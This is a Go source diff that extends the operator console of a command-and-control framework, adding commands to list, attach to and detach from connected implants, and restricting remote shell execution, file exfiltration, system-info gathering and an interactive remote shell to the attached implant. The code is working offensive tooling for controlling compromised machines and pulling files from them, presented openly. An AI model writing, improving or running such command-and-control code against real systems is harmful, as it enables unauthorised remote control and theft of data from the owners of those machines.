@@ -35,6 +35,7 @@ type Operator struct {
 	pollBackoff      time.Duration         // 0 = normal, >0 = rate limited
 	lastPoll         time.Time             // timestamp of last successful poll
 	pollInterval     time.Duration         // background poll interval
+	attachedClient   string                // currently attached client_id ("" = none)
 }
 
 // NewOperator creates a new operator.
@@ -165,7 +166,7 @@ func (op *Operator) checkForCheckins() bool {
 		for _, s := range seqs {
 			fmt.Println()
 			displayResult(s, results[s])
-			fmt.Printf("[%s] c2> ", time.Now().Format("15:04"))
+			fmt.Print(op.prompt())
 		}
 		return true
 	}
@@ -220,7 +221,7 @@ func (op *Operator) Interactive() {
 	scanner := bufio.NewScanner(os.Stdin)
 
 	for {
-		fmt.Printf("[%s] c2> ", time.Now().Format("15:04"))
+		fmt.Print(op.prompt())
 		if !scanner.Scan() {
 			fmt.Println("\n[*] Exiting")
 			break
@@ -244,20 +245,40 @@ func (op *Operator) Interactive() {
 			return
 		case "help":
 			printHelp()
+		case "agents":
+			op.printAgents()
+		case "attach":
+			op.attachAgent(arg)
+		case "detach":
+			op.detachAgent()
 		case "shell":
+			if !op.requireAttached() {
+				continue
+			}
 			if arg == "" {
 				fmt.Println("[!] Usage: shell <command>")
 				continue
 			}
 			op.SendCommand("shell", map[string]interface{}{"cmd": arg})
 		case "exfil":
+			if !op.requireAttached() {
+				continue
+			}
 			if arg == "" {
 				fmt.Println("[!] Usage: exfil <path>")
 				continue
 			}
 			op.SendCommand("exfil", map[string]interface{}{"path": arg})
 		case "sysinfo":
+			if !op.requireAttached() {
+				continue
+			}
 			op.SendCommand("sysinfo", nil)
+		case "ishell":
+			if !op.requireAttached() {
+				continue
+			}
+			op.interactiveShell(scanner)
 		case "results":
 			results, err := op.PollResults()
 			if err != nil {
@@ -294,8 +315,6 @@ func (op *Operator) Interactive() {
 			if result != nil {
 				displayResult(seqNum, result)
 			}
-		case "ishell":
-			op.interactiveShell(scanner)
 		case "clean":
 			op.cleanAll()
 		case "status":
@@ -306,21 +325,97 @@ func (op *Operator) Interactive() {
 	}
 }
 
+// prompt returns the current prompt string based on attach state.
+func (op *Operator) prompt() string {
+	ts := time.Now().Format("15:04")
+	if op.attachedClient != "" {
+		info := op.connectedClients[op.attachedClient]
+		return fmt.Sprintf("[%s] %s@%s > ",
+			ts, op.attachedClient[:8], info.Hostname)
+	}
+	return fmt.Sprintf("[%s] c2> ", ts)
+}
+
+// printAgents shows a table of connected implants.
+func (op *Operator) printAgents() {
+	if len(op.connectedClients) == 0 {
+		fmt.Println("[*] No agents connected")
+		return
+	}
+	fmt.Printf("\n  %-10s %-16s %-20s %-10s %s\n",
+		"ID", "HOSTNAME", "OS", "USER", "CONNECTED")
+	fmt.Printf("  %-10s %-16s %-20s %-10s %s\n",
+		"----------", "----------------", "--------------------",
+		"----------", "-------------------")
+	for cid, info := range op.connectedClients {
+		marker := "  "
+		if cid == op.attachedClient {
+			marker = "* "
+		}
+		fmt.Printf("%s%-10s %-16s %-20s %-10s %s\n",
+			marker, cid[:8], info.Hostname, info.OS,
+			info.User, info.ConnectedAt)
+	}
+	fmt.Println()
+}
+
+// attachAgent attaches to a specific agent by client_id (or prefix).
+func (op *Operator) attachAgent(idPrefix string) {
+	if idPrefix == "" {
+		// If only one agent, auto-attach
+		if len(op.connectedClients) == 1 {
+			for cid := range op.connectedClients {
+				op.attachedClient = cid
+				info := op.connectedClients[cid]
+				fmt.Printf("[*] Attached to %s (%s)\n",
+					cid[:8], info.Hostname)
+				return
+			}
+		}
+		fmt.Println("[!] Usage: attach <client_id>")
+		fmt.Println("[!] Use 'agents' to list connected implants")
+		return
+	}
+
+	// Match by prefix
+	for cid, info := range op.connectedClients {
+		if strings.HasPrefix(cid, idPrefix) {
+			op.attachedClient = cid
+			fmt.Printf("[*] Attached to %s (%s)\n",
+				cid[:8], info.Hostname)
+			return
+		}
+	}
+	fmt.Printf("[!] No agent matching '%s'. Use 'agents' to list.\n", idPrefix)
+}
+
+// detachAgent detaches from the current agent.
+func (op *Operator) detachAgent() {
+	if op.attachedClient == "" {
+		fmt.Println("[*] Not attached to any agent")
+		return
+	}
+	info := op.connectedClients[op.attachedClient]
+	fmt.Printf("[*] Detached from %s (%s)\n",
+		op.attachedClient[:8], info.Hostname)
+	op.attachedClient = ""
+}
+
+// requireAttached checks if an agent is attached before running commands.
+func (op *Operator) requireAttached() bool {
+	if op.attachedClient == "" {
+		fmt.Println("[!] No agent attached. Use 'agents' to list, 'attach <id>' to select.")
+		return false
+	}
+	return true
+}
+
 // interactiveShell provides a remote shell experience.
 // Detects client OS and shows appropriate prompt ($ or >).
 // Each command is sent, then waits with animated dots until result arrives.
 func (op *Operator) interactiveShell(scanner *bufio.Scanner) {
-	if len(op.connectedClients) == 0 {
-		fmt.Println("[!] No implants connected. Wait for a check-in first.")
-		return
-	}
-
-	// Pick the first connected client
-	var clientID string
-	var info ClientInfo
-	for clientID, info = range op.connectedClients {
-		break
-	}
+	clientID := op.attachedClient
+	info := op.connectedClients[clientID]
 
 	// Determine shell type from OS
 	isWindows := strings.Contains(strings.ToLower(info.OS), "windows")
@@ -482,9 +577,9 @@ func (op *Operator) handleCheckin(result map[string]interface{}) {
 		"    hostname  : %s\n"+
 		"    os        : %s\n"+
 		"    user      : %s\n"+
-		"    timestamp : %s\n\n[%s] c2> ",
+		"    timestamp : %s\n\n%s",
 		clientID, hostname, osInfo, user, timestamp,
-		time.Now().Format("15:04"))
+		op.prompt())
 }
 
 func displayResult(seq int, result map[string]interface{}) {
@@ -510,15 +605,22 @@ func displayResult(seq int, result map[string]interface{}) {
 
 func printHelp() {
 	fmt.Println(`
-Available commands:
+Agent management:
+  agents          List connected implants
+  attach <id>     Attach to an agent (prefix match, e.g. 'attach 0f7b')
+  detach          Detach from current agent
+
+Commands (requires attached agent):
   ishell          Interactive remote shell (auto-detects bash/powershell)
-  shell <cmd>     Execute a single shell command on the implant
-  exfil <path>    Exfiltrate a file from the implant
-  sysinfo         Gather system info from the implant
-  results         Poll for pending results (single pass)
-  wait <seq>      Wait for a specific result (blocking)
+  shell <cmd>     Execute a single shell command
+  exfil <path>    Exfiltrate a file
+  sysinfo         Gather system info
+
+Other:
+  results         Poll for pending results
+  wait <seq>      Wait for a specific result
+  status          Show agents and pending commands
   clean           Remove all C2 playlists
-  status          Show connected implants and pending commands
   help            Show this help
   quit / exit     Exit the console`)
 }
